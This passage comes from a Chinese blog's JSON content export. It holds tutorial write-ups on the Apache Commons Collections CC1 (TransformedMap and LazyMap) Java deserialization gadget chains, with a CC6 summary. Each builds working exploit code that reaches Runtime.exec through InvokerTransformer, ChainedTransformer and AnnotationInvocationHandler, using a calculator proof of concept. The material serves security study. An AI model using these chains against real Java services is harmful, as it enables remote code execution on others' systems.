总结CC链6这条链相对简单，就是CC链1-LazyMap的后半截加上URLDNS的前半截，组合成为一条新的链，并且这条链不受java版本限制","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(2)：CC链1-LazyMap","slug":"CC链1-LazyMap","date":"2025-07-08T14:36:56.000Z","updated":"2025-07-13T09:19:59.733Z","comments":true,"path":"2025/07/08/CC链1-LazyMap/","permalink":"http://example.com/2025/07/08/CC%E9%93%BE1-LazyMap/","excerpt":"","text":"CC链1-LazyMap这里来说说CC链1的另外一条链：LazyMap。它和TransformedMap链的执行点一样，都是InvokerTransformer，不同的是中间的调用点不同，调用时涉及到动态代理相关知识，需要提前学习了解这块的内容。 搭建环境 jdk8u65 Commons-Collections 3.2.1 执行点：InvokerTransformer这里的执行点和TransformedMap链相同，不再过多赘述 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 调用点：LazyMap与CC链1-TransformedMap不同的就在这里，这条链的调用点在同一个包中的LazyMap链中 具体的调用点是在LazyMap的get方法中 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 这里是factory在调用transform方法，这里的factory来自于该类的构造函数，所以这里就要传入invokertransformer，才能变成invokertransformer.transform 1234567protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = FactoryTransformer.getInstance(factory);&#125; 但是这里构造函数通过protected修饰，所以还需要找调用点，然后找到了当前类的decorate方法，接收参数然后返回当前类的实例 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 尝试构造下利用代码，参数有两个，第一个是一个Map，第二个需要传入构造的invokertransformer 12345678910public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, invokerTransformer); decorate.get(Runtime.getRuntime());&#125; 执行代码能够弹出计算器，则构造没问题，需要注意的是在get方法中存在一个判断，判断传入的map集合中是否包含传入get方法的参数，我们这里构造的不包含，所以能够进入代码。 然后我们需要查找get方法的调用。 调用点和反序列化入口：AnnotationInvocationHandler调用get方法的地方非常多，最后找到了AnnotationInvocationHandler这个类，和CC链1-TransformedMap的入口类一样，但是这里暂时作为调用点存在，这里的调用点在invoke方法中的Object result = memberValues.get(member);处调用了get方法，而memberValues来自于构造方法赋值，要想memberValues.get变成LazyMap.get，那么构造方法中就需要传入前面创建好的decorate。 12345678910111213141516171819202122232425262728293031323334public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; 其实这整个类AnnotationInvocationHandler是一个动态代理的调用处理器类，某个对象调用方法时使用了该类进行代理，就会自动执行该类的invoke方法。如调用A类的xxx方法，如果对A.method使用B类进行了动态代理，那么调用A.xxx的时候就会自动执行B.invoke，有点类似于php的魔术方法 那么当前状态下，我们这里作为代理类，应该代理哪个类呢？我们这里是反序列化链，最好的就是反序列化时会调用到被动态代理的对象的某个方法，正好当前类中存在反序列化readObject方法，所以最好选择readObject方法中可控的点传入被动态代理对象。 如何选择可控点？这里先查看invoke方法中执行到get方法时需要哪些条件来进行决定。 在执行到get前存在两个if和一个switch，在判断member和paramTypes，二者都来自于来自于mehtod，method其实就是要进行代理的方法。这里member获取的就是要代理的方法名，而paramTypes表示方法的参数类型列表 第一个if判断member是否存在equals，即方法名是否存在equals关键字，存在则返回，所以方法不能包含equals才能往下走。 第二个if判断paramTypes是否为0，如果不为0则报错，所以代理的方法需要是一个无参方法才能往下走 switch中则是定义了三个case，如果member满足任意一个都会直接返回，所以这里也不能满足这里的任意一个。 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 那么在readObject方法中满足以上条件调用点就是memberValues.entrySet()，即我们要对memberValues进行代理，而这个memberValues是构造方法中传入的一个Map，即创建的动态代理对象要实现Map接口，这样才能代理到Map中的方法。 创建动态代理存在三个参数： 被代理类的类加载器（通常用接口或相关类的类加载器） 被代理类要实现的接口数组（JDK 动态代理只能代理接口） 代理处理器，定义代理对象的方法调用逻辑。 这里已经知道了第二个参数是Map接口，那么其余两个参数呢？ 第一个参数：这个参数用来将代理类进行动态加载，这个类要能加载到接口类，所以直接选择LazyMap或者Map这两个类的加载器即可 第三个参数：我们要执行的invoke方法位于AnnotationInvocationHandler，所以这里传入AnnotationInvocationHandler的对象 那么根据这些条件来构造利用链 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); //decorate.get(Runtime.getRuntime()); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); // 这里创建对象时不用像CC1TransformedMap那样需要注意传入的注解类成员变量相关 // 转为InvocationHandler作为代理处理器使用 InvocationHandler o = (InvocationHandler) annotationConstructor.newInstance(Target.class, decorate); // 这里实现了Map接口，要作为Map使用，则转为Map类型 Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o); // 这里再次创建对象，传入代理过后的对象 Object o1 = annotationConstructor.newInstance(Target.class, map); //serialize(o1); unserialize(&quot;ser.bin&quot;);&#125; 总结LazyMap这条链相对于TransformedMap要复杂一点，主要是中间还涉及到动态代理相关的知识","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(1)：CC链1-TransformedMap","slug":"CC链1-TransformedMap","date":"2025-07-06T15:26:15.000Z","updated":"2025-07-13T09:27:27.154Z","comments":true,"path":"2025/07/06/CC链1-TransformedMap/","permalink":"http://example.com/2025/07/06/CC%E9%93%BE1-TransformedMap/","excerpt":"","text":"CC链1-TransformedMap反序列化利用链的大概流程如下图所示，其实就是找到一个可利用点，不停寻找调用点，一直到起点调用，中间的调用点可以不存在，也可以很多 这里先来说说CC链1，CC链1存在两条链，先说TransformedMap这一条 搭建环境 jdk8u65 Commons-Collections 3.2.1 执行点：InvokerTransformer在InvokerTransformer这个类中，存在一个transform方法，接收一个类文件，然后进行反射调用 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 其中的iMethodName、iParamTypes等参数，来自于这个类的构造文件 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; 也就是说这个反射代码的所有参数都可以进行控制，只要能传入指定参数就能够实现任意代码执行。构造如下代码，运行成功弹出计算器 123456public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(Runtime.getRuntime()); &#125;&#125; 调用点1：TransformedMap查找关于transform方法的调用，在TransformedMap这个类中找到一处可利用的调用点checkSetValue方法 123protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; 如果能够将valueTransformer设置为InvokerTransformer，参数传递为Runtime.getRuntime,那么就能够执行到我们的代码。 查找valueTransformer的赋值，是来自于构造函数 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125; 这里的构造函数接收三个参数，一个Map和两个Transformer。但是这个构造函数是被protected修饰，表示只能被当前类或父子类进行调用，查找这个构造方法的调用点，找到一个decorate方法 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 接收参数，然后返回一个TransformedMap类的实例 构造一个TransformedMap实例，构造一个Map集合传入，keyTransformer参数不需要，传入null即可。valueTransformer的位置传入构造的invokerTransformer 12345678910public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hmap, null, invokerTransformer); &#125;&#125; 此时调用获取的decorate对象的checkSetValue方法并传入参数，但是这个方法也是protected修饰，也是只能被当前类或父子类进行调用，继续查找调用。 调用点2：AbstractInputCheckedMapDecorator查找checkSetValue调用只有一处，位于AbstractInputCheckedMapDecorator类的setValue方法中，这个类是TransformedMap类的父类，这个方法位于MapEntry这个内部静态类中 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator &#123; /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 那么这里我们应该如何赋值并调用呢？直接问AI 这个类是一个装饰器，对原本Map.Entry进行包装修饰增强，其实就是遍历Map集合，一个Entry就是Map集合中的一个键值对，按照提示构造代码，能够弹出计算器 1234567891011121314public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); for(Object object : decorate.entrySet()) &#123; Map.Entry entry = (Map.Entry) object; // 这里 setValue 会触发 invokerTransformer 的 transform 方法 entry.setValue(Runtime.getRuntime()); &#125; &#125;&#125; 这里为什么遍历就能过执行到内部类中的setValue方法？简单来说，TransformedMap继承了AbstractInputCheckedMapDecorator类，这个类重写了entrySet方法，最后返回的就是AbstractInputCheckedMapDecorator的MapEntry 我们继续查找AbstractInputCheckedMapDecorator类中内部类MapEntry的setValue方法的调用 反序列化入口：AnnotationInvocationHandler查找setValue调用时，在AnnotationInvocationHandler类中找到了调用点，位于readObject方法中，能够直接作为反序列化起点使用，并且正好在进行处于遍历的过程中 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 在这里只要控制memberValue为Invokertransformer，给setValue传入参数Runtime.getRuntime，就能进行命令执行 这里的memberValue是对memberValues遍历获取的键值对，来自于memberValues，也就说控制memberValues为构造的TransformedMap集合，就能够执行到漏洞代码。而memberValues是通过构造函数进行赋值的，所以这里先新建这个对象。 但是这个类没有修饰符，即默认为default修饰，这表示只允许当前包中调用 所以这里选择反射进行调用赋值。查看构造函数中的参数，第一个是一个继承了注解类的Class类，即需要一个注解的Class。第二个参数是一个Map集合，这里就传入我们构造的TransformedMap 12345678910111213141516171819public class CC1TransformedMap &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for(Object object : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) object; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 这里对这个对象o进行序列化和反序列化是否能够实现命令执行呢？答案是不能，这里还存在三个问题： Runtime类没有实现序列化接口，所以传入的Runtime.getRuntime无法进入序列化流程 setValue的参数不能控制为我们想要传入的参数 readObject方法中还存在两个if判断，需要绕过 解决问题1：反射解决Runtime无法序列化既然无法直接序列化Runtime，那么就通过反射进行赋值操作，这里直接采用InvokerTransformer类进行赋值反射操作 123456789101112131415161718192021public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.Class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 可以看到这里执行了很多相同的新建InvokerTransformer并执行了transform方法，可以通过ChainsTransformer类进行优化，这个类构造函数接收一个Transformer数组，然后它的transform方法接收一个参数，数组中第一个transformer通过transform方法接收这个参数，并将执行结果作为参数传入第二个transformer中 构造代码，此时如果我们调用chainedTransformer.transform(Runtime.class)就成功执行代码，就说明这里的构造没有问题。 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 解决问题2：setValue参数无法控制这里调用setValue方法其实就是在调用transform方法，其中的参数最后会传递到transform方法中。 但是这里参数无法控制，应该怎么传入我们想要的值呢？ 这里就要引入一个ConstantTransformer类，这个类的transform方法接收任意参数都只会返回iConstant，然而iConstant是构造方法中进行赋值的，也就是说只要实例化这个类时传入构造函数的参数为Runtime.class，无论transform接收到什么参数，都只会返回Runtime.class 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate);&#125; 假如当执行到setValue时，传入的参数是1，就相当于chainedTransformer的transform方法接收到了一个1，然后传递给Transformer数组中的第一个Transformer的transform方法，即ConstantTransformer的transform，最后返回了Runtime.class。再将这个结果传递给第二个Transformer的transform方法作为参数，成功绕过了setValue无法控制的问题。 解决问题3：绕过if判断第一个判断第一个判断是if (memberType != null) &#123; 判断memberType 是否为空 memerType的构造大概如下： 123456Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); ......&#125; annotationType.memberTypes();中annotationType来自于构造方法接收的注解类，这里大概就是获取传入注解类的成员属性和类型，返回为一个Map集合 String name = memberValue.getKey();：其中memberValue是遍历memberValues是的每一个键值对，这个memberValues也是来自于构造方法接收的参数，也就是我们构造的hMap集合，然后遍历时获取其中键值对的键名。 Class&lt;?&gt; memberType = memberTypes.get(name);：这里就是获取注解类中为hMap键名的值 那么第一个判断其实就是在判断hMap的键名是否是传入的注解类中的一个成员属性名，如果是就进入判断。所以这里就要满足两个条件： 传入的注解类存在成员属性 hMap集合的key要设置为这个注解类的成员属性名 我们这里传入的注解类是Target，查看这个类，正好存在一个成员属性value 所以接下来需要将hMap的键名设置为value即可 1234567891011121314151617181920212223242526272829public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 第二个判断第二个判断是：if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))，简单来说这里就是在判断hMap的value是否是某个实例，如果不是就进入判断。 我们这里传入的是一个随机字符串，不用处理就能够直接进入这一层的if 最终利用链根据上面的思路构造的利用链如下，此时执行反序列化就能够实现任意命令，这里是弹出计算器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package com.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); //serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 流程图","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}],"categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}